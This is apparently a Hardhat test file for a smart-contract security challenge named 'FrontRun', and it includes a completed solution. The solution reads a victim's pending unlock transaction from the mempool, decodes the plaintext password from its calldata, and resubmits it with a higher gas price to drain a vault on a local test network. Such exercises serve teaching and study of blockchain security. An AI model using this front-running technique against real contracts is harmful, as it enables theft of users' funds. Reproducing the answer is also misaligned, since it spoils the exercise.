import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, network } from "hardhat";

describe("FrontRun", function () {
  let alice: SignerWithAddress, attacker: SignerWithAddress;
  const VAULT_BALANCE = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP - DO NOT TOUCH ANYTHING HERE */
    [alice, attacker] = await ethers.getSigners();

    // Set inital balance of attacker to 0.1 ETH
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);

    // Set inital balance of alice to 11 ETH
    await ethers.provider.send("hardhat_setBalance", [
      alice.address,
      "0x98A7D9B8314C0000", // 11 ETH
    ]);

    // Disable automine on the hardhat network and set the block time to 1 second
    await network.provider.send("evm_setAutomine", [false]);
    await network.provider.send("evm_setIntervalMining", [1000]);

    const VaultFactory = await ethers.getContractFactory("Vault", alice);

    // Generate random password
    // DO NOT ACCESS THIS VARIABLE IN YOUR EXPLOIT
    const password = ethers.utils.randomBytes(32);
    const hashedPassword = ethers.utils.keccak256(password);

    this.vault = await VaultFactory.deploy(hashedPassword, {
      value: VAULT_BALANCE,
    });

    await this.vault.deployed();

    expect(await this.vault.getHashedSecret()).to.equal(hashedPassword);
    expect(await ethers.provider.getBalance(this.vault.address)).to.equal(
      VAULT_BALANCE
    );

    // ALICE SENDS TX TO WITHDRAW FUNDS
    await this.vault.unlock(password);
  });

  it("EXPLOIT", async function () {
    /** WRITE YOUR EXPLOIT CODE HERE */
    /** END EXPLOIT CODE */


    // *** SNIFF PASSWORD ***

    // Get unlock transaction from Alice; must be transaction 0 in pending block
    const tx = (await network.provider.send("eth_getBlockByNumber", [ "pending", true ])).transactions[0];

    // Get arguments of unlock call from tx data by removing function signature (first 4 bytes) from tx data 
    const encodedArgs = ethers.utils.hexDataSlice(tx.input, 4);

    // Decode password argument of type "bytes" from unlock call arguments (unlock function has only 1 argument).
    const passwordHexString = ethers.utils.defaultAbiCoder.decode([ "bytes" ], encodedArgs)[0];
    const password = ethers.utils.arrayify(passwordHexString);


    // *** FRONT-RUN TRANSACTION OF ALICE ***

    // Parse gas price of original unlock transaction and increase it by 1 wei
    const newGasPrice = ethers.BigNumber.from(tx.gasPrice).add(1);

    // Send attacker unlock transaction to mempool with orignal password and increased gas price
    // to get included into the next block instead of original transaction 
    await this.vault.connect(attacker).unlock(password, { gasPrice: newGasPrice });
  });

  after(async function () {
    // Mine the block to ensure transactions are processed
    network.provider.send("evm_mine");
    expect(await ethers.provider.getBalance(this.vault.address)).to.equal("0");

    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      VAULT_BALANCE
    );

    expect(await ethers.provider.getBalance(alice.address)).to.be.lt(
      ethers.utils.parseEther("1")
    );
  });
});
